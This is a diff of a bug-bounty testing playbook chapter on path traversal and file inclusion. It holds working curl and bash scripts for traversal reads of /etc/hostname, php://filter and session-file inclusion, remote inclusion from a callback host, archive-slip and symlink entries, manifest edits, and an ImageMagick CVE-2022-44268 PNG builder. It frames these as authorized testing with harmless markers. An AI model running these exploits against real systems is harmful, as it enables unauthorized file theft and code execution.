@@ -10,7 +10,7 @@
 |---|---|
 | **Class** | `traversal` |
 | **Applies when** | http, app\|api |
-| **Pays** | 356 disclosed reports (44 more touch the class), 64 paid, median $1,000, top $29,000. The five best-paid ($12,000 to $29,000, all GitLab) read files through import, issue-move and package-registry code that built a path from data the user controlled; the long tail is download and include parameters, nginx aliases and known-CVE traversals in servers and appliances. |
+| **Pays** | 356 disclosed reports (44 more touch the class), 64 paid, median $1,000, top $29,000. The five best-paid ($12,000 to $29,000) are all GitLab: arbitrary file reads in import and issue-move jobs, a package-registry traversal and a traversal to code execution; the long tail is download and include parameters, nginx aliases and known-CVE traversals in servers and appliances. |
 | **Weaknesses** | Path Traversal · Relative Path Traversal · Path Traversal: '.../...//' · PHP Local File Inclusion · Remote File Inclusion · External Control of File Name or Path · Improper Link Resolution Before File Access ('Link Following') · CWE-22, CWE-23, CWE-35, CWE-36, CWE-59, CWE-73, CWE-98 |
 
 ## Why it pays
@@ -23,8 +23,8 @@ format, and the seam between a proxy and the server behind it. The best-paid rep
 arbitrary file read through the bulk-import uploads pipeline ($29,000, #1439593), through the uploads rewriter when
 an issue is moved ($20,000, #827052) and during project import ($16,000, #1132378), all rated critical. A markdown
 plugin that read local files paid $6,000 (#518641), a diagram renderer $5,600 (#1098793), video upload through
-FFmpeg's HLS parser $2,727 (#1062888), an nginx alias one slash short $1,200 (#1650273). A plain `file=` parameter
-pays $150 to $500 (#346825, #895972, #1624670) unless the file it reaches matters.
+FFmpeg's HLS parser $2,727 (#1062888), an nginx alias one slash short $1,200 (#1650273). An ordinary LFI on one
+endpoint pays $150 to $500 (#346825, #895972, #1624670) unless the file it reaches matters.
 
 Filters fail in a few repeatable ways: the check runs before a second decoding (#232371; the incomplete fix in
 Apache 2.4.50, #1404731), `../` is stripped once and `....//` survives, a prefix is checked before the path is
@@ -254,7 +254,7 @@ LFI-010 (converters and renderers) → LFI-007 (upload names) → LFI-011 (objec
            'C:\lfi003-does-not-exist.ini' '/proc/self/cwd/package.json'; do n=$((n+1))
     curl -sS "${HDR[@]}" $A --get --data-urlencode "$P=$v" "$U" -o "$D/$n.body" -w "%{http_code} %{size_download} $n [$v]\n"
     sleep "$W"; done | tee "$D/results.txt"
-  head -c 120 "$D"/[1-5].body "$D"/[7-9].body
+  head -c 120 "$D"/*.body
   ```
   `/proc/self/cwd/` is the process's working directory on Linux, usually the application root: replace
   `package.json` with the manifest of the stack (`composer.json`, `Gemfile`, `requirements.txt`, `pom.xml`). When
@@ -338,7 +338,7 @@ LFI-010 (converters and renderers) → LFI-007 (upload names) → LFI-011 (objec
   credentials. Include confirmed with `allow_url_include` off: LFI-005 (bytes we place, filter chains). Includes of
   `http://`: LFI-006 (needs `oob`). A `phar://` path that reaches `file_exists`, `getimagesize` or similar: DSR-008.
 
-### LFI-005 · A PHP include reaches bytes we control (our session file, an upload, a log line or a `php://filter` chain), shown with a plain-text marker
+### LFI-005 · A PHP include reaches bytes we control (session file, upload, log or `php://filter` chain), shown with a plain marker
 
 | | |
 |---|---|
@@ -350,11 +350,11 @@ LFI-010 (converters and renderers) → LFI-007 (upload names) → LFI-011 (objec
 | **Weakness** | PHP Local File Inclusion · CWE-98 |
 | **Prior art** | #411140, #272578, #60058 |
 
-- **Where:** a PHP parameter that includes the file it names: `page=contact` renders the contact page, and
-  `php://filter/convert.base64-encode/resource=contact` returns base64 source instead. You need bytes in a file you
-  can name: our own PHP session file (the `PHPSESSID` cookie, and a feature that stores something we type in the
-  session: user name, language, search terms, cart), an upload whose server path you know, or a log the PHP user
-  can read. A `php://filter` chain needs no file at all.
+- **Where:** a PHP parameter that includes the file it names: `page=contact` renders the contact page (the body
+  holds no `<?php`, so the code ran), and `php://filter/convert.base64-encode/resource=contact` returns base64
+  source instead. You need bytes in a file you can name: our own PHP session file (the `PHPSESSID` cookie, and a
+  feature that stores something we type in the session: user name, language, search terms, cart), an upload whose
+  server path you know, or a log the PHP user can read. A `php://filter` chain needs no file at all.
 - **Test:** include parses whatever bytes the file holds. If our bytes come back in the output of the include, PHP
   code in the same place would run: that is the route from LFI to code execution. Prove the reach with a
   plain-text marker and stop. A PHP tag written into a log or session file stays on disk and runs at every later
@@ -365,8 +365,8 @@ LFI-010 (converters and renderers) → LFI-007 (upload names) → LFI-011 (objec
   D="$E/evidence/$H/LFI-005"; mkdir -p "$D"; W=$(awk -v r="$RATE" 'BEGIN{printf "%.2f", 1/r}')
   U="$T/index.php"; P=page; M="lfi005-$RANDOM"   # the include parameter; M is the marker (letters, digits, dash)
   g() { curl -sS "${HDR[@]}" $A --get --data-urlencode "$P=$1" "$U" -o "$D/$2.body" -w "%{http_code} %{size_download} $2\n"; sleep "$W"; }
-  # 0. confirm the sink includes: base64 source comes back for the page it normally renders
-  g "php://filter/convert.base64-encode/resource=contact" sink
+  # 0. an include, not a read: the plain value renders (no '<?php' in its body) and php://filter returns its source
+  g "contact" plain; grep -c '<?php' "$D/plain.body"; g "php://filter/convert.base64-encode/resource=contact" sink
   # 1. our own session file: store the marker in a value the application keeps in the session, then include the file
   SID=$(sed -n 's/.*PHPSESSID=\([A-Za-z0-9,-]*\).*/\1/p' "$E/accounts/A.headers" | head -1)
   curl -sS "${HDR[@]}" $A --get --data-urlencode "q=$M" "$T/search" -o /dev/null     # any feature that stores input in the session
@@ -391,15 +391,15 @@ LFI-010 (converters and renderers) → LFI-007 (upload names) → LFI-011 (objec
   the application uses no sessions but is removed when the upload ends, so reaching it is a race of hundreds of
   requests.
 - **Proof:** the include response containing the marker, the request that placed it (session value, upload or
-  chain), the control row without it, and the `sink` row showing the parameter includes. In the report, state that
-  a PHP tag in the same place would execute and that none was written. Only where the policy accepts proof of
-  execution: one chain generated for `<?php echo 41*271;?>` returning `11111`, nothing else.
+  chain), the control row without it, and the `plain` and `sink` rows showing the parameter includes. In the
+  report, state that a PHP tag in the same place would execute and that none was written. Only where the policy
+  accepts proof of execution: one chain generated for `<?php echo 41*271;?>` returning `11111`, nothing else.
 - **Not a finding when:** the marker appears because the page echoes the search term or the session value anyway:
   the control include must not contain it. Sessions are kept in Redis, Memcached or a database
   (`session.save_handler`), so every session path fails. `open_basedir restriction in effect` in a warning: the
-  include is confined to the allowed tree. The sink turns out to be `readfile` or `file_get_contents` (the `sink`
-  row prints PHP source instead of base64): the marker shows, but PHP code would be printed, not run; that is a read
-  primitive (LFI-001 severity).
+  include is confined to the allowed tree. The sink turns out to be `readfile` or `file_get_contents` (the `plain`
+  row prints `<?php` source instead of the rendered page): the marker shows, but PHP code would be printed, not
+  run; that is a read primitive (LFI-001 severity).
 - **Escalate:** report it as an include of attacker-controlled bytes with execution described; the RCE chapter has
   the conventions for describing execution that was not performed. A writable upload directory that the include
   can reach is also UPL territory.
@@ -425,11 +425,12 @@ LFI-010 (converters and renderers) → LFI-007 (upload names) → LFI-011 (objec
   request from the target shows the fetch; the marker without the comment in the response shows PHP parsed the file
   as code. A suffix the application appends (`.php`) becomes part of a query string after `?` or a fragment after
   `#`.
-- **How:**
+- **How:** on the callback host, serve the file and leave the server running:
   ```bash
-  # on the callback host: the file, served over HTTP
   printf '<?php /* lfi006 */ ?>lfi006-included\n' > lfi006.txt; python3 -m http.server 8000
-  # against the target
+  ```
+  Then against the target:
+  ```bash
   D="$E/evidence/$H/LFI-006"; mkdir -p "$D"; W=$(awk -v r="$RATE" 'BEGIN{printf "%.2f", 1/r}')
   U="$T/index.php"; P=page     # the include parameter
   n=0; for v in "http://$OOB:8000/lfi006.txt" "http://$OOB:8000/lfi006.txt?" "http://$OOB:8000/lfi006.txt#" \
@@ -452,7 +453,7 @@ LFI-010 (converters and renderers) → LFI-007 (upload names) → LFI-011 (objec
 - **Escalate:** report it with the empty block as the proof; the RCE chapter has the conventions for describing
   code execution that was not performed. A fetch without inclusion: SSR-002 and SSR-003 for internal reach.
 
-### LFI-007 · An upload's file name, or a name inside the uploaded file, is used as a storage path and `../` places a new file outside the upload directory
+### LFI-007 · An upload's file name or embedded name is used as a storage path, and `../` places a new file outside the upload directory
 
 | | |
 |---|---|
@@ -509,7 +510,7 @@ LFI-010 (converters and renderers) → LFI-007 (upload names) → LFI-011 (objec
   execution, described and not done. Name the files an overwrite would hit (templates, `authorized_keys`, cron
   entries) and do not attempt one. Keys in object storage: LFI-011.
 
-### LFI-008 · An archive the server extracts writes an entry named `../` outside the extraction directory, or a symlink entry makes it return a local file
+### LFI-008 · Archive extraction writes a `../` entry outside its directory, or a symlink entry makes the server return a local file
 
 | | |
 |---|---|
@@ -571,12 +572,14 @@ LFI-010 (converters and renderers) → LFI-007 (upload names) → LFI-011 (objec
   `/etc/hostname` returned where the application serves or imports `$R-link.txt`, with the `tar -tvzf` line showing
   the link. Remove the imported objects through the application and record anything left in `cleanup.md`.
 - **Not a finding when:** the member list shows `$R-up1.txt` at the top level or the import refuses the entry:
-  names are sanitised (Python's `zipfile`, current node-tar and Python 3.12+ tar filters strip `../`, absolute names
-  and outside links; hand-written loops over Java's `ZipInputStream` or old Python `tarfile` usually do not). The
-  link member comes back as a 13-byte text file holding `/etc/hostname`: the extractor stored the link as a plain
-  file (Java and Python `zipfile` do). The `../` file lands in a throwaway job directory's parent that nothing
-  serves or reads: a write with no effect. A plugin or theme upload that installs code by design and is open only to
-  administrators: uploading code is the feature.
+  names are sanitised. The common extractors do this by default: Info-ZIP `unzip` skips `../` components, GNU tar
+  and bsdtar refuse members containing `..`, Python's `zipfile` strips them, and Python's `tarfile` refuses them
+  and absolute links from 3.14 (its `data` filter, opt-in since 3.12). The vulnerable code is usually a hand-written
+  loop over Java's `ZipInputStream`, Go's `archive/zip` or an older `tarfile`. The link member comes back as a
+  13-byte text file holding `/etc/hostname`: the extractor stored the link as a plain file (Java's
+  `ZipInputStream` and Python's `zipfile` do). The `../` file lands in a throwaway job directory's parent that
+  nothing serves or reads: a write with no effect. A plugin or theme upload that installs code by design and is
+  open only to administrators: uploading code is the feature.
 - **Escalate:** a member written into a served or executing directory: as LFI-007, described and not planted.
   Imports that also copy files the archive's manifest names: LFI-009. A known extraction CVE in the identified
   product: the CVE chapter.
@@ -612,10 +615,10 @@ LFI-010 (converters and renderers) → LFI-007 (upload names) → LFI-011 (objec
   curl -sS "${HDR[@]}" $A -F "file=@$D/lfi009.txt;type=text/plain" "$T/api/projects/$SRC/uploads" -o "$D/upload.json"; cat "$D/upload.json"
   #    for example {"url":"/uploads/4f9c2e.../lfi009.txt","markdown":"[lfi009.txt](/uploads/4f9c2e.../lfi009.txt)"}
   REF=$(grep -o '"url":"[^"]*"' "$D/upload.json" | head -1 | cut -d'"' -f4)
-  EVIL="${REF%/*}/../../../../../../../../../../etc/hostname"      # generated segments kept, the name replaced
+  TRAV="${REF%/*}/../../../../../../../../../../etc/hostname"      # generated segments kept, the name replaced
   # 2. store content that carries the edited reference
   curl -sS "${HDR[@]}" $A -X POST "$T/api/projects/$SRC/issues" -H 'Content-Type: application/json' \
-    -d "{\"title\":\"lfi009\",\"description\":\"[lfi009]($EVIL)\"}" -o "$D/issue.json"
+    -d "{\"title\":\"lfi009\",\"description\":\"[lfi009]($TRAV)\"}" -o "$D/issue.json"
   ID=$(grep -o '"id":[0-9]*' "$D/issue.json" | head -1 | cut -d: -f2)
   # 3. run the job that copies attachments, then open the copy it wrote into the destination
   curl -sS "${HDR[@]}" $A -X POST "$T/api/projects/$SRC/issues/$ID/move" -H 'Content-Type: application/json' \
@@ -630,6 +633,7 @@ LFI-010 (converters and renderers) → LFI-007 (upload names) → LFI-011 (objec
   grep -rlE '"[a-z_]*path"|/uploads/' "$D/x" | head        # the manifest entries that name files
   # edit one entry to ../../../../../../../../etc/hostname (generated segments kept), then repack and import
   tar -czf "$D/import.tar.gz" -C "$D/x" .
+  diff <(tar -tzf "$D/export.tar.gz" | sed 's#^\./##' | sort) <(tar -tzf "$D/import.tar.gz" | sed 's#^\./##' | sort)   # same members
   ```
 - **Proof:** the copied attachment in our destination project containing `/etc/hostname`, with the stored
   reference, the trigger request and the job's response; or the imported attachment from the edited manifest. One
@@ -683,6 +687,7 @@ LFI-010 (converters and renderers) → LFI-007 (upload names) → LFI-011 (objec
   printf '@startuml\nnote as N\n!include /etc/hostname\nend note\n@enduml\n' > "$D/lfi010.puml"
   curl -sS "${HDR[@]}" $A -X POST "$T/kroki/plantuml/png" -H 'Content-Type: text/plain' --data-binary @"$D/lfi010.puml" -o "$D/diagram.png"
   # ImageMagick (CVE-2022-44268 builds): a PNG text chunk named "profile" makes the converter embed that file in its output
+  # clean.png is any small PNG of our own that the avatar upload accepts
   python3 - clean.png "$D/lfi010.png" <<'PY'
   import struct, sys, zlib
   src, out = sys.argv[1], sys.argv[2]
@@ -719,8 +724,8 @@ LFI-010 (converters and renderers) → LFI-007 (upload names) → LFI-011 (objec
 - **Not a finding when:** the output shows the reference as text or a link: a safe mode is on (Asciidoctor's
   `secure` mode, the default for its API, turns `include::` into a link; Kroki's default safe mode and PlantUML's
   `SANDBOX` and `INTERNET` security profiles refuse local includes; docutils with `file_insertion_enabled` off
-  ignores `.. include::`). AsciiDoc in `safe` or `server` mode reads includes only inside its base directory, and
-  the jail error is not a finding. FFmpeg refuses the playlist (`is not in allowed_extensions` in a job error, or no
+  answers `.. include::` with a "directive disabled" warning). AsciiDoc in `safe` or `server` mode reads includes
+  only inside its base directory, and the jail error is not a finding. FFmpeg refuses the playlist (`is not in allowed_extensions` in a job error, or no
   frames): a current build. The ImageMagick chunk is ignored outside the CVE-2022-44268 builds, and programmes that
   exclude known CVEs inside their patch window close that variant (`known-cve`). The file is rendered by your own
   browser (client-side Mermaid, a JavaScript Markdown preview): the browser has no access to the server's disk.
@@ -740,11 +745,12 @@ LFI-010 (converters and renderers) → LFI-007 (upload names) → LFI-011 (objec
 | **Weakness** | Path Traversal · CWE-22 |
 | **Prior art** | #254200, #3580511, #2334455 |
 
-- **Where:** uploads and downloads whose URLs or responses show a bucket (`<bucket>.s3.amazonaws.com/<prefix>/<user
-  id>/<name>`, `storage.googleapis.com/<bucket>/...`, `<account>.blob.core.windows.net/<container>/...`): pre-signed
-  upload requests that take a file name (`POST /api/uploads/presign {"filename":...}`), avatar uploads (#254200),
-  download proxies that take a key or name (`/api/files/download?name=`), image resizers that read from a bucket by
-  key, blob keys a client may choose (#3580511).
+- **Where:** uploads and downloads whose URLs or responses show a bucket
+  (`<bucket>.s3.amazonaws.com/<prefix>/<user id>/<name>`, `storage.googleapis.com/<bucket>/...`,
+  `<account>.blob.core.windows.net/<container>/...`): pre-signed upload requests that take a file name
+  (`POST /api/uploads/presign {"filename":...}`), avatar uploads (#254200), download proxies that take a key or name
+  (`/api/files/download?name=`), image resizers that read from a bucket by key, blob keys a client may choose
+  (#3580511).
 - **Test:** an object store has no directories and keeps `a/../b` as a literal key. The prefix escape needs a layer
   that resolves dot segments first: the application building the key with a filesystem function (`path.join`,
   `os.path.normpath`, `Paths.get(...).normalize()`), or a proxy or CDN in front of the bucket normalising the URL.
